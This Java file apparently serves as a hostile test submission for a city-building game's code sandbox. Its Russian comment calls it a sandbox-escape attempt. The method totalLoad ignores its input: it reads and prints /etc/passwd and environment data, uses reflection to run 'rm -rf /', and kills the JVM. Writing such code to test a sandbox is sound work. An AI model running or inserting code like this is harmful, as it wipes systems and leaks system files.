package city.player;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;

/** Попытка выйти из песочницы: чтение файлов, переменные окружения, завершение JVM, рефлексия. */
public final class PowerGrid {

    public static long totalLoad(int[] sectorLoads) throws Exception {
        String secrets = Files.readString(Path.of("/etc/passwd"));
        System.out.println(new File("/").list().length + System.getenv("HOME") + secrets);
        Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(Runtime.getRuntime(), "rm -rf /");
        System.exit(0);
        return 0;
    }
}
